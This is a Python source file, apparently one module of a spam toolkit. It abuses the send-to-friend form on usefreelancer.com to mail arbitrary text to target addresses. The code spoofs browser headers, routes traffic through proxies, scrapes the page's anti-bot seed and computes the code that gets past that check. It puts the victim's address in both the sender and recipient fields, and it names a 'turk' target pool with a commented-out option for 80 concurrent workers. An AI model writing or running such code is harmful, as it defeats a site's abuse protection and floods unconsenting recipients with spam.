import re
from os.path import basename

import requests

from module import Spam


def get(session: requests.Session):
    headers = {
        'authority': 'www.usefreelancer.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
        'cache-control': 'max-age=0',
        'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'none',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
    }

    response = session.get('https://www.usefreelancer.com/send-to-friend/spreadit', headers=headers)
    return response


def post(session: requests.Session, code, text: str, target):
    headers = {
        'authority': 'www.usefreelancer.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
        'cache-control': 'max-age=0',
        'origin': 'https://www.usefreelancer.com',
        'referer': 'https://www.usefreelancer.com/send-to-friend/spreadit',
        'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
    }

    data = {
        'url': 'https://www.google.com/',
        'yourname': 'text',
        'friendname': text,
        'message': text,
        'youremail': target,
        'friendemail': target,
        'code': code,
        'ok': '1',
    }

    response = session.post('https://www.usefreelancer.com/send-to-friend/spreadit', headers=headers, data=data)
    return response


def display_code(seed: str, minus_code):
    seed = int(seed)
    code = (seed * 8 - 39) - (seed * 7 + 78)
    code = code - int(minus_code)
    if code < 0:
        code = 0 - code
    return str(code)


s = 'Thank you! Your email has been sent'


class ConcreteSpam(Spam):

    def post(self, target) -> requests.Response | None:
        s = requests.Session()
        s.proxies = self.get_proxies()
        get_resp = get(s)
        pattern = re.compile("(?<=displayCode\(\').*(?=\'\)\))")
        pattern_minus_code = re.compile("(?<=code=code-).*(?=;)")
        seed = pattern.search(get_resp.text)
        minus_code = pattern_minus_code.search(get_resp.text)
        seed_minus_code_empty = not any((seed, minus_code))
        if seed_minus_code_empty:
            return
        post_resp = post(s, display_code(seed.group(0), minus_code.group(0)), self.get_text(), target)
        return post_resp


def main():
    spam = ConcreteSpam(basename(__file__).removesuffix('.py'), s, target_pool_name='turk')
    res = spam.send_post()
    # if res:
    #     spam.run_concurrently(80)


if __name__ == '__main__':
    main()
